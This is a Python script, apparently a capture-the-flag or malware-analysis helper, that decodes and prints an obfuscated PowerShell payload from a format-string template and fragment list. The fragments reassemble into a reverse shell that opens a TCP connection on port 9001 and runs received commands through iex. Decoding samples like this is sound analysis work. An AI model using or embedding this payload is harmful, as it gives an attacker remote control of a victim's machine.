def deobfuscate_powershell_format(template_str, args_list):
    """
    Takes a PowerShell format string with {index} references and an argument list,
    then returns the deobfuscated PowerShell script.
    """
    try:
        return template_str.format(*args_list)
    except IndexError as e:
        return f"Error during format substitution: {e}"

# === Replace these with any future payloads ===
template = ("{47}{90}{16}{94}{30}{84}{52}{111}{58}{56}{33}{106}{101}{23}{11}{73}{92}"
            "{14}{86}{49}{115}{113}{80}{70}{22}{98}{40}{10}{6}{67}{5}{69}{25}{44}{71}"
            "{45}{61}{57}{97}{99}{104}{110}{117}{109}{105}{91}{53}{51}{34}{100}{26}{21}"
            "{13}{116}{39}{24}{103}{78}{37}{72}{2}{7}{85}{8}{82}{55}{68}{75}{89}{12}{64}"
            "{43}{4}{3}{35}{77}{38}{32}{63}{93}{28}{17}{96}{79}{66}{36}{29}{87}{107}{108}"
            "{83}{48}{54}{1}{0}{112}{9}{102}{15}{31}{18}{81}{50}{88}{20}{76}{59}{65}{74}"
            "{60}{62}{41}{46}{114}{95}{27}{19}{42}")

args = [
    '.', 't', 'n', ')', 'ing ', '};while((n', '4', 'z0sendback ', ' (i', ']::ASCII)',
    'L6', '0n}1', '2>&1 L6', 'ding', ' nz0clie', 'etBytes(nz0sendb', ' = Ne', 'endback',
    ');n', 'lose(', 'rite', 'ASCIIEnco', '= 0.', '1', 'es,', '0i = nz0str', '.', 'nt.C',
    's', 'pwd)', 'Object System.', 'ack2', 'b', 'm3_', 'peName System.Tex', ';nz0', '(',
    ')', 'nd', 'GetString(nz0byt', '5', 'lush()', ')\n', ' Out-Str', 'eam.Read', 'nz0b',
    '};nz0', 'nz', 'yte = ', '.GetStream();[byt', '0s', 'y', 'So', 'ect -T', '([tex',
    ' nz', 'wwf{s0', 'z0b', 'ts.TCPClient(19R', 'byte,0', 'ength);nz0str', 'ytes, 0, n',
    'eam.F', 'ac', '4', ',nz0sendbyte.', 'S 19R + ', '%{0', '0d', 'z', 'tes ', '(',
    ';', '9R,9001);n', 'L', 'a', '(nz0send', 'se', '0i', ' 19RP', 'nz0by', 'z', 'ex',
    '9R;nz0sendb', 'Net.', '=', 'nt', '.Path ', 'tream.W', 'ta ', '0client', 'bj',
    'z0stream =', 'k2  = nz0', 'w-', 'ie', ' +', 'y', '.6553', 'tes.Length)) -ne 0){;nz0',
    't', 'l_0bfusc47', '.G', '0, nz', 'dat', 'O', 'p0w3r5h3l', '+ 19R', '> 1', 'New-',
    'a = ', 'cke', 'encoding', '[]]', 'cl', 'e', ').', '('
]

# === Run deobfuscation ===
if __name__ == "__main__":
    result = deobfuscate_powershell_format(template, args)
    print("=== Deobfuscated PowerShell Payload ===\n")
    print(result)
